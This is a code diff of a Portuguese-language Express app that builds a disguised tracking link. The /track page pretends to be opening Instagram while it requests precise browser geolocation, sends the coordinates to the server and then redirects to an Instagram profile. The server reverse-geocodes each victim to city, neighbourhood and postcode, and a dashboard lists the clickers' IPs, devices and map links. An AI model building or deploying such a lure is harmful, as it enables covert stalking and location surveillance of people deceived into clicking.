@@ -15,12 +15,11 @@ app.get('/', (req, res) => {
     <html lang="pt-BR">
     <head>
       <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>📊 Dashboard de Rastreamento GPS</title>
+      <title>📊 Dashboard GPS</title>
       <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+          font-family: Arial, sans-serif;
           background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
           min-height: 100vh;
           padding: 2rem;
@@ -30,51 +29,47 @@ app.get('/', (req, res) => {
           background: white;
           padding: 2rem;
           border-radius: 15px;
-          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
           margin-bottom: 2rem;
           text-align: center;
         }
-        .header h1 { color: #333; margin-bottom: 1rem; font-size: 2rem; }
         .tracking-link {
           background: #667eea;
           color: white;
           padding: 1rem 2rem;
           border-radius: 10px;
+          text-decoration: none;
           display: inline-block;
           margin-top: 1rem;
-          text-decoration: none;
-          font-weight: 600;
         }
         .stats {
           display: grid;
-          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
           gap: 1rem;
           margin-bottom: 2rem;
         }
         .stat-card {
           background: white;
           padding: 1.5rem;
-          border-radius: 15px;
+          border-radius: 10px;
           text-align: center;
         }
         .stat-card h3 { color: #667eea; font-size: 2rem; }
-        .clicks-container { display: grid; gap: 1.5rem; }
+        .clicks-container { display: grid; gap: 1rem; }
         .click-card {
           background: white;
-          padding: 2rem;
-          border-radius: 15px;
+          padding: 1.5rem;
+          border-radius: 10px;
         }
         .click-card.with-gps { border-left: 5px solid #10b981; }
         .click-card.no-gps { border-left: 5px solid #ef4444; }
         .maps-link {
-          display: inline-block;
           background: #10b981;
           color: white;
           padding: 0.8rem 1.5rem;
           border-radius: 8px;
           text-decoration: none;
+          display: inline-block;
           margin-top: 1rem;
-          font-weight: 600;
         }
         .reload-btn {
           background: #667eea;
@@ -83,9 +78,7 @@ app.get('/', (req, res) => {
           padding: 1rem 2rem;
           border-radius: 10px;
           cursor: pointer;
-          font-size: 1rem;
-          font-weight: 600;
-          margin-bottom: 2rem;
+          margin-bottom: 1rem;
         }
       </style>
     </head>
@@ -93,98 +86,63 @@ app.get('/', (req, res) => {
       <div class="container">
         <div class="header">
           <h1>📊 Dashboard de Rastreamento GPS</h1>
-          <p>Monitore quem clica no seu link com localização precisa</p>
-          <a href="/track" class="tracking-link" target="_blank">🔗 Link de Rastreamento</a>
+          <a href="/track" class="tracking-link">🔗 Link de Rastreamento</a>
         </div>
         <button class="reload-btn" onclick="loadData()">🔄 Atualizar</button>
         <div id="stats" class="stats"></div>
         <div id="clicks" class="clicks-container"></div>
       </div>
-<script>
-        const clickId = ${clickData.id};
-        
-        console.log('🔍 Iniciando captura de GPS...');
-        console.log('Click ID:', clickId);
-        
-        if (navigator.geolocation) {
-          console.log('✅ Geolocalização disponível no navegador');
+      <script>
+        async function loadData() {
+          const res = await fetch('/api/stats');
+          const data = await res.json();
           
-          navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-              console.log('✅ GPS capturado com sucesso!');
-              console.log('📍 Latitude:', pos.coords.latitude);
-              console.log('📍 Longitude:', pos.coords.longitude);
-              console.log('🎯 Precisão:', pos.coords.accuracy, 'm');
-              
-              const gpsData = {
-                clickId: clickId,
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude,
-                accuracy: pos.coords.accuracy,
-                timestamp: new Date().toISOString()
-              };
-              
-              console.log('📤 Enviando GPS para servidor...', gpsData);
-              
-              try {
-                const response = await fetch('/api/save-gps', {
-                  method: 'POST',
-                  headers: {'Content-Type': 'application/json'},
-                  body: JSON.stringify(gpsData)
-                });
-                
-                const result = await response.json();
-                console.log('✅ Resposta do servidor:', result);
-                
-                if (result.success) {
-                  console.log('✅ GPS salvo com sucesso!');
-                } else {
-                  console.error('❌ Erro ao salvar GPS');
-                }
-              } catch (error) {
-                console.error('❌ Erro ao enviar GPS:', error);
-              }
-              
-              // Redireciona após enviar GPS
-              console.log('🔄 Redirecionando para Instagram...');
-              setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/andre.osantos12/';
-              }, 1000);
-            },
-            (error) => {
-              console.error('❌ Erro ao obter GPS:', error);
-              console.log('Código do erro:', error.code);
-              console.log('Mensagem:', error.message);
-              
-              // Códigos de erro:
-              // 1 = PERMISSION_DENIED
-              // 2 = POSITION_UNAVAILABLE
-              // 3 = TIMEOUT
-              
-              setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/andre.osantos12/';
-              }, 1500);
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 10000, // Aumentado para 10 segundos
-              maximumAge: 0
-            }
-          );
-        } else {
-          console.error('❌ Geolocalização não disponível neste navegador');
-          setTimeout(() => {
-            window.location.href = 'https://www.instagram.com/andre.osantos12/';
-          }, 1500);
-        }
-      </script>
+          document.getElementById('stats').innerHTML = \`
+            <div class="stat-card"><h3>\${data.totalClicks}</h3><p>Total</p></div>
+            <div class="stat-card"><h3>\${data.clicksComGPS || 0}</h3><p>Com GPS</p></div>
+            <div class="stat-card"><h3>\${data.totalClicks - (data.clicksComGPS || 0)}</h3><p>Sem GPS</p></div>
+          \`;
 
+          const clicksHtml = data.clicks.map(c => {
+            const hasGPS = c.gps && c.gps.lat;
+            const loc = c.location;
+            
+            return \`
+              <div class="click-card \${hasGPS ? 'with-gps' : 'no-gps'}">
+                <div><strong>⏰</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</div>
+                <div><strong>🌐 IP:</strong> \${c.ip}</div>
+                <div><strong>📱</strong> \${c.device}</div>
+                \${hasGPS ? \`
+                  <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #10b981;">
+                    <div style="color: #10b981; font-weight: bold;">📍 LOCALIZAÇÃO GPS EXATA</div>
+                    \${loc ? \`
+                      <div><strong>🏙️ Cidade:</strong> \${loc.cidade}, \${loc.estado}</div>
+                      <div><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
+                      <div><strong>📮 CEP:</strong> \${loc.cep}</div>
+                    \` : ''}
+                    <div><strong>🗺️</strong> \${c.gps.lat}, \${c.gps.lng}</div>
+                    <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
+                       target="_blank" class="maps-link">📍 Ver no Google Maps</a>
+                  </div>
+                \` : \`
+                  <div style="color: #ef4444; margin-top: 1rem;">⚠️ GPS não autorizado</div>
+                \`}
+              </div>
+            \`;
+          }).join('');
+          
+          document.getElementById('clicks').innerHTML = clicksHtml || '<p>Nenhum clique</p>';
+        }
+        
+        loadData();
+        setInterval(loadData, 10000);
+      </script>
     </body>
     </html>
   `);
 });
 
-// ROTA 2: Rastreamento /track
+// ROTA 2: Rastreamento
 app.get('/track', (req, res) => {
   const clickData = {
     id: clicks.length + 1,
@@ -196,14 +154,13 @@ app.get('/track', (req, res) => {
   };
   
   clicks.push(clickData);
-  console.log('📍 Clique:', clickData);
+  console.log('📍 Novo clique ID:', clickData.id);
   
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
       <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Redirecionando...</title>
       <style>
         body {
@@ -233,34 +190,61 @@ app.get('/track', (req, res) => {
       <div>
         <div class="spinner"></div>
         <h1>📷 Abrindo Instagram</h1>
-        <p>Aguarde...</p>
+        <p id="status">Aguarde...</p>
       </div>
       <script>
         const clickId = ${clickData.id};
         
+        console.log('🔍 Click ID:', clickId);
+        console.log('🔍 Iniciando captura de GPS...');
+        
         if (navigator.geolocation) {
+          console.log('✅ Geolocalização disponível');
+          document.getElementById('status').textContent = 'Obtendo localização...';
+          
           navigator.geolocation.getCurrentPosition(
             async (pos) => {
-              await fetch('/api/save-gps', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                  clickId: clickId,
-                  latitude: pos.coords.latitude,
-                  longitude: pos.coords.longitude,
-                  accuracy: pos.coords.accuracy
-                })
-              });
-              window.location.href = 'https://www.instagram.com/andre.osantos12/';
+              console.log('✅ GPS capturado!');
+              console.log('📍 Lat:', pos.coords.latitude, 'Lng:', pos.coords.longitude);
+              
+              const gpsData = {
+                clickId: clickId,
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                timestamp: new Date().toISOString()
+              };
+              
+              console.log('📤 Enviando GPS...');
+              
+              try {
+                const response = await fetch('/api/save-gps', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify(gpsData)
+                });
+                
+                const result = await response.json();
+                console.log('✅ Servidor respondeu:', result);
+              } catch (error) {
+                console.error('❌ Erro ao enviar:', error);
+              }
+              
+              document.getElementById('status').textContent = 'Redirecionando...';
+              setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/andre.osantos12/';
+              }, 1000);
             },
-            () => {
+            (error) => {
+              console.error('❌ Erro GPS:', error.code, error.message);
               setTimeout(() => {
                 window.location.href = 'https://www.instagram.com/andre.osantos12/';
               }, 1500);
             },
-            {enableHighAccuracy: true, timeout: 5000}
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
         } else {
+          console.error('❌ GPS não disponível');
           setTimeout(() => {
             window.location.href = 'https://www.instagram.com/andre.osantos12/';
           }, 1500);
@@ -273,34 +257,67 @@ app.get('/track', (req, res) => {
 
 // ROTA 3: Salvar GPS
 app.post('/api/save-gps', async (req, res) => {
-  console.log('\n📥 Recebendo requisição de GPS...');
-  console.log('Body recebido:', req.body);
+  console.log('\n📥 Requisição GPS recebida');
+  console.log('Body:', req.body);
   
   try {
     const gps = req.body;
     
     if (!gps || !gps.latitude || !gps.longitude) {
-      console.error('❌ Dados de GPS inválidos:', gps);
+      console.error('❌ Dados inválidos');
       return res.status(400).json({success: false, error: 'Dados inválidos'});
     }
     
     gpsData.push(gps);
-    console.log('✅ GPS adicionado ao array gpsData');
+    console.log('✅ GPS adicionado ao array');
     
     const click = clicks.find(c => c.id === gps.clickId);
-    console.log('🔍 Procurando click com ID:', gps.clickId);
-    console.log('📊 Total de clicks no array:', clicks.length);
+    console.log('🔍 Click ID:', gps.clickId, '- Encontrado:', !!click);
     
     if (click) {
-      console.log('✅ Click encontrado!');
       click.gps = {
         lat: gps.latitude,
         lng: gps.longitude,
         accuracy: gps.accuracy
-      });
+      };
       
-      // ... resto do código de geolocalização ...
-// ROTA 4: API Stats
+      console.log('✅ GPS associado ao click');
+      console.log(`📍 ${gps.latitude}, ${gps.longitude}`);
+      console.log(`🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
+      
+      // Busca endereço
+      try {
+        const response = await fetch(
+          `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
+        );
+        
+        const data = await response.json();
+        
+        if (data) {
+          click.location = {
+            cidade: data.city || data.locality || 'N/A',
+            estado: data.principalSubdivision || 'N/A',
+            pais: data.countryName || 'Brasil',
+            bairro: data.localityInfo?.administrative?.[0]?.name || 'N/A',
+            cep: data.postcode || 'N/A'
+          };
+          
+          console.log(`🏙️ ${click.location.cidade}, ${click.location.estado}`);
+          console.log(`🏘️ ${click.location.bairro}`);
+        }
+      } catch (error) {
+        console.error('❌ Erro ao buscar endereço:', error.message);
+      }
+    }
+    
+    res.json({success: true});
+  } catch (error) {
+    console.error('❌ Erro:', error);
+    res.status(500).json({success: false});
+  }
+});
+
+// ROTA 4: Stats
 app.get('/api/stats', (req, res) => {
   res.json({
     totalClicks: clicks.length,
